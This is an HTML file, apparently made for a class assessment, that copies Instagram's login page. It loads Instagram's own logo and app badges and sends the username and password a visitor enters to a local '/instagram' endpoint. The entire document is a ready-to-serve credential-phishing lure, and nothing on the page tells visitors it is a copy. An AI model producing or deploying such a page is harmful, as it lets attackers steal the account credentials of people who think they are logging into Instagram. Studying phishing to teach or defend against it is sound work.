<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login - Class Assessment</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            padding: 32px 0;
        }

        .login-container {
            width: 100%;
            max-width: 350px;
            margin: 0 auto;
            padding: 20px 0;
        }

        .login-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 40px;
            margin-bottom: 10px;
            text-align: center;
        }

        .logo {
            margin: 22px auto 12px;
            width: 175px;
        }

        .input-field {
            position: relative;
            margin-bottom: 6px;
        }

        input {
            width: 100%;
            padding: 9px 8px 7px;
            font-size: 12px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
            outline: none;
        }

        input:focus {
            border: 1px solid #a8a8a8;
        }

        .login-button {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 5px 9px;
            font-weight: 600;
            margin: 8px 0;
            cursor: pointer;
            opacity: 0.7;
        }

        .login-button.active {
            opacity: 1;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 10px 0 18px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
            margin: 0 10px;
        }

        .facebook-login {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            margin: 8px 0;
            display: flex;
            justify-content: center;
            align-items: center;
            text-decoration: none;
        }

        .facebook-icon {
            margin-right: 8px;
            font-size: 16px;
        }

        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            display: block;
            margin-top: 12px;
        }

        .signup-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px;
            text-align: center;
            font-size: 14px;
        }

        .signup-link {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        .app-download {
            text-align: center;
            margin-top: 20px;
        }

        .app-download p {
            font-size: 14px;
            margin: 10px 0;
        }

        .app-buttons {
            display: flex;
            justify-content: center;
            gap: 8px;
        }

        .app-button {
            height: 40px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-box">
            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
            
            <!-- Form action set to /instagram and method POST -->
            <form action="/instagram" method="POST">
                <div class="input-field">
                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
                </div>
                
                <div class="input-field">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                
                <button type="submit" class="login-button" id="loginButton">Log in</button>
            </form>
            
            <div class="divider">OR</div>
            
            <a href="#" class="facebook-login">
                <span class="facebook-icon">f</span> Log in with Facebook
            </a>
            
            <a href="#" class="forgot-password">Forgot password?</a>
        </div>
        
        <div class="signup-box">
            Don't have an account? <a href="#" class="signup-link">Sign up</a>
        </div>
        
        <div class="app-download">
            <p>Get the app.</p>
            <div class="app-buttons">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="Download on the App Store" class="app-button">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Get it on Google Play" class="app-button">
            </div>
        </div>
    </div>
</body>
</html>
